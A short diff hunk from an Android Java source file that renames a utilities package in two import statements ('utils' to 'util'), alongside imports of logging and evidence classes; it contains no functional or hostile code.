@@ -15,8 +15,8 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
-import com.ht.RCSAndroidGUI.utils.WChar;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+import com.ht.RCSAndroidGUI.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
